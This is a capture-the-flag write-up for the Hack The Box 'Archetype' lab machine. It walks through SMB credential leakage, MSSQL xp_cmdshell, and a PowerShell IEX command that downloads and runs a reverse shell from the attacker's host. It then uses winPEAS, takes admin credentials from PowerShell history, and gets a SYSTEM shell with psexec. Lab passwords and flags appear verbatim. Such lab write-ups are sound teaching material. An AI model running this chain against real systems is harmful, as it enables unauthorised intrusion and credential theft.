# CTF Writeup: Archetype (Hack The Box)

## Overview

This writeup documents the exploitation path for the "Archetype" machine. The attack chain begins with enumerating SMB shares to find leaked credentials. These credentials are used to access a Microsoft SQL Server instance, where we enable `xp_cmdshell` to gain an initial reverse shell. Finally, privilege escalation is achieved by checking the PowerShell history file, which reveals the Administrator's password, allowing us to gain full `nt authority\system` access via `psexec`.

## 1. Reconnaissance & Enumeration

We begin by scanning the target machine using Nmap to identify open ports and running services.

```bash
nmap -sV -A -T4 10.129.179.20        
```

**Output snippet:**
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-22 07:37 -0400
Nmap scan report for 10.129.179.20
Host is up (0.27s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

The scan reveals SMB (445) and Microsoft SQL Server (1433) are open. We proceed to enumerate the SMB shares using anonymous login. 

```bash
smbclient -L 10.129.179.20
```

After discovering the available shares, we attempt to access the `ADMIN$` share but are denied. However, we successfully access the `backups` share.

```bash
smbclient \\\\10.129.179.20\\backups
```
```text
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

smb: \> get prod.dtsConfig 
```

Upon downloading and inspecting the `prod.dtsConfig` file, we discover plaintext credentials for the `sql_svc` user.

**Password Found:** `M3g4c0rp123`

<img width="1914" height="283" alt="image" src="https://github.com/user-attachments/assets/c3aab7b8-4ffe-4916-85b0-838b8c8a5a31" />

## 2. Initial Access via MSSQL

Using the discovered credentials, we authenticate to the MSSQL service using Impacket's `mssqlclient.py`.

```bash
impacket-mssqlclient sql_svc@10.129.179.20 -windows-auth 
```

Once authenticated, we use the `help` command to see our options. Our goal is to achieve remote code execution using `xp_cmdshell`. 

First, we set up a local Python HTTP server hosting a PowerShell reverse shell script (`powershell-reverse-shell.ps1`).

<img width="1901" height="461" alt="image" src="https://github.com/user-attachments/assets/a3ea7f7e-c7d7-4df7-8c76-e07a7b551879" />

Next, we start a netcat listener on port 9999 and execute the payload via the SQL prompt to download and execute our reverse shell in memory:

```sql
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.14.205:8080/powershell-reverse-shell.ps1\")
```

We successfully catch the shell on our netcat listener:

```bash
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# nc -lvnp 9999                       
listening on [any] 9999 ...
connect to [10.10.14.205] from (UNKNOWN) [10.129.179.20] 50417
SHELL> 
```

<img width="941" height="421" alt="image" src="https://github.com/user-attachments/assets/bf6e12de-d263-40a8-aec5-bcd90543cc7f" />

From here, we can read the user flag.
**user.txt:** `3e7b102e78218e935bf3f4951fec21a3`

## 3. Privilege Escalation

To enumerate the system further, we download `winPEASx64.exe` to the target machine using `Invoke-WebRequest`.

```powershell
Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.14.205:8080/winPEASx64.exe" -OutFile "C:\Users\sql_svc\Desktop\winPEASx64.exe"
```

Running WinPEAS provides a lot of output regarding potential misconfigurations and sensitive files.

<img width="1910" height="772" alt="image" src="https://github.com/user-attachments/assets/f976bc75-7737-483d-b52e-dd74568ea33f" />

One of the common places to look for leaked credentials on Windows systems is the PowerShell history file. We check the `ConsoleHost_history.txt` file for the `sql_svc` user:

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

<img width="1873" height="406" alt="image" src="https://github.com/user-attachments/assets/87418560-8ee6-479e-a488-13c097141e9c" />

<img width="1453" height="415" alt="image" src="https://github.com/user-attachments/assets/9ec35763-b367-43f0-86ab-cf13e7987b0d" />

The history file reveals that an administrator previously mapped a drive using explicit credentials. 
**Credentials found:** `administrator:MEGACORP_4dm1n!!`

With valid Administrator credentials, we can now use Impacket's `psexec.py` to get a highly privileged SYSTEM shell.

```bash
impacket-psexec administrator:'MEGACORP_4dm1n!!'@10.129.179.20
```

<img width="1132" height="600" alt="image" src="https://github.com/user-attachments/assets/d2754aa4-3962-4d1f-bd5d-f14cf34a52af" />

We are successfully dropped into a shell as `nt authority\system`. Finally, we navigate to the Administrator's desktop and read the root flag.

```cmd
C:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528
```

---

### External References & Resources
*   [HTB Starting Point Walkthrough - Archetype (Medium)](https://ludvikkristoffersen.medium.com/htb-starting-point-walkthrough-archetype-9ce989a79014)
*   [Tier II Archetype HTB Walkthrough (Medium)](https://medium.com/@oparahreginaldcx7/tier-ii-archetype-htb-28e0ae0fe028)
*   [PEASS-ng Releases (WinPEAS)](https://github.com/peass-ng/PEASS-ng/releases/tag/20240407-0335a42b)
*   [PowerShell Reverse Shell Script](https://raw.githubusercontent.com/martinsohn/PowerShell-reverse-shell/refs/heads/main/powershell-reverse-shell.ps1)